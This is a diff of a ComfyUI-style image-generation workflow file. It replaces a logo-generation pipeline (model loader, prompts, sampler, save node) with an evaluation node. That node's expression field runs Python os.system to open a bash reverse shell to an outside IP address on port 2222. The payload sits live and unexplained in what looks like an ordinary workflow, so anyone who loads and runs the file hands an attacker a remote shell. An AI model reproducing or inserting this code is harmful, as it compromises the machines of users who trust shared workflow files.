@@ -1,86 +1,39 @@
 {
   "1": {
-    "class_type": "CheckpointLoaderSimple",
     "inputs": {
-      "ckpt_name": "ponyrealismV22VAE.gWd2.safetensors"
+      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
+      "input_count": 1,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "EvaluateMultiple1",
+    "_meta": {
+      "title": "EvaluateMultiple1"
     }
   },
   "2": {
-    "class_type": "CLIPTextEncode",
     "inputs": {
-      "text": "Logo discord avec les lettres RS pour un developpeur",
-      "clip": [
-        "1",
-        1
-      ]
+      "noise_seed": 920431842220899
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "Случайный шум"
     }
   },
   "3": {
-    "class_type": "CLIPTextEncode",
     "inputs": {
-      "text": "blurry, low quality, lowres, jpeg artifacts, watermark, signature, text, deformed, bad anatomy, bad hands, extra fingers, mutation, ugly, worst quality",
-      "clip": [
-        "1",
-        1
-      ]
-    }
-  },
-  "4": {
-    "class_type": "EmptyLatentImage",
-    "inputs": {
-      "width": 1024,
-      "height": 1024,
-      "batch_size": 1
-    }
-  },
-  "5": {
-    "class_type": "KSampler",
-    "inputs": {
-      "seed": 666659308,
-      "steps": 25,
-      "cfg": 7.0,
-      "sampler_name": "dpmpp_2m",
-      "scheduler": "karras",
-      "denoise": 1.0,
-      "model": [
+      "source": [
         "1",
         0
-      ],
-      "positive": [
-        "2",
-        0
-      ],
-      "negative": [
-        "3",
-        0
-      ],
-      "latent_image": [
-        "4",
-        0
       ]
-    }
-  },
-  "6": {
-    "class_type": "VAEDecode",
-    "inputs": {
-      "samples": [
-        "5",
-        0
-      ],
-      "vae": [
-        "1",
-        2
-      ]
-    }
-  },
-  "7": {
-    "class_type": "SaveImage",
-    "inputs": {
-      "images": [
-        "6",
-        0
-      ],
-      "filename_prefix": "fantasy"
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Предпросмотр любого"
     }
   }
 }
